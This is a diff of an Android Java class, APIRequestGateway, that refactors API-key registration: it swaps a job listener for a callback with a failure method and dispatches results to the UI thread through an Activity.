@@ -1,8 +1,11 @@
 package com.theah64.xrob.utils;
 
+import android.app.Activity;
 import android.content.Context;
 import android.content.SharedPreferences;
+import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
+import android.support.annotation.WorkerThread;
 import android.util.Log;
 
 import com.theah64.xrob.interfaces.JobListener;
@@ -26,34 +29,35 @@ public class APIRequestGateway {
     private static final String KEY_API_KEY = "api_key";
 
     private static final String X = APIRequestGateway.class.getSimpleName();
+    private final Activity activity;
 
     public interface APIRequestGatewayCallback {
         void onReadyToRequest(final String apiKey);
+
+        void onFailed(final String reason);
     }
 
     private final Context context;
-    private final JobListener jobCallback;
+    @NonNull
     private final APIRequestGatewayCallback callback;
 
-    private APIRequestGateway(Context context, @Nullable JobListener jobCallback, @Nullable APIRequestGatewayCallback callback) {
+    private APIRequestGateway(Context context, final Activity activity, @NonNull APIRequestGatewayCallback callback) {
         this.context = context;
-        this.jobCallback = jobCallback;
+        this.activity = activity;
         this.callback = callback;
+        execute();
     }
 
-    public APIRequestGateway(final Context context, final JobListener jobCallback) {
-        this(context, jobCallback, null);
+    public APIRequestGateway(final Activity activity, APIRequestGatewayCallback callback) {
+        this(activity.getBaseContext(), activity, callback);
     }
 
-    public APIRequestGateway(final Context context, final APIRequestGatewayCallback callback) {
+    public APIRequestGateway(Context context, APIRequestGatewayCallback callback) {
         this(context, null, callback);
     }
 
-    private void register(final Context context) {
 
-        if (jobCallback != null) {
-            jobCallback.onJobStart();
-        }
+    private void register(final Context context) {
 
         final ProfileUtils profileUtils = ProfileUtils.getInstance(context);
 
@@ -78,10 +82,17 @@ public class APIRequestGateway {
         OkHttpUtils.getInstance().getClient().newCall(inRequest).enqueue(new Callback() {
 
             @Override
-            public void onFailure(Call call, IOException e) {
+            public void onFailure(Call call, final IOException e) {
                 e.printStackTrace();
-                if (jobCallback != null) {
-                    jobCallback.onJobFailed(e.getMessage());
+                if (activity != null) {
+                    activity.runOnUiThread(new Runnable() {
+                        @Override
+                        public void run() {
+                            callback.onFailed(e.getMessage());
+                        }
+                    });
+                } else {
+                    callback.onFailed(e.getMessage());
                 }
             }
 
@@ -100,20 +111,31 @@ public class APIRequestGateway {
                     }
 
                     editor.putString(KEY_API_KEY, apiKey).commit();
+                    editor.putBoolean(PrefUtils.IS_LOGGED_IN, true);
 
+                    if (activity != null) {
 
-                    if (jobCallback != null) {
-                        jobCallback.onJobFinish(apiKey);
-                    }
+                        activity.runOnUiThread(new Runnable() {
+                            @Override
+                            public void run() {
+                                callback.onReadyToRequest(apiKey);
+                            }
+                        });
 
-                    if (callback != null) {
+                    } else {
                         callback.onReadyToRequest(apiKey);
                     }
-
                 } catch (JSONException | APIResponse.APIException e) {
                     e.printStackTrace();
-                    if (jobCallback != null) {
-                        jobCallback.onJobFailed(e.getMessage());
+                    if (activity != null) {
+                        activity.runOnUiThread(new Runnable() {
+                            @Override
+                            public void run() {
+                                callback.onFailed(e.getMessage());
+                            }
+                        });
+                    } else {
+                        callback.onFailed(e.getMessage());
                     }
                 }
             }
@@ -121,7 +143,7 @@ public class APIRequestGateway {
 
     }
 
-    public void execute() {
+    private void execute() {
 
         Log.d(X, "Opening gateway...");
 
@@ -136,11 +158,14 @@ public class APIRequestGateway {
 
                 Log.d(X, "hasApiKey " + apiKey);
 
-                if (jobCallback != null) {
-                    jobCallback.onJobFinish(apiKey);
-                }
-
-                if (callback != null) {
+                if (activity != null) {
+                    activity.runOnUiThread(new Runnable() {
+                        @Override
+                        public void run() {
+                            callback.onReadyToRequest(apiKey);
+                        }
+                    });
+                } else {
                     callback.onReadyToRequest(apiKey);
                 }
 
@@ -154,8 +179,15 @@ public class APIRequestGateway {
 
         } else {
 
-            if (jobCallback != null) {
-                jobCallback.onJobFailed("No network");
+            if (activity != null) {
+                activity.runOnUiThread(new Runnable() {
+                    @Override
+                    public void run() {
+                        callback.onFailed("No network!");
+                    }
+                });
+            } else {
+                callback.onFailed("No network!");
             }
 
             Log.e(X, "Doesn't have APIKEY and no network!");
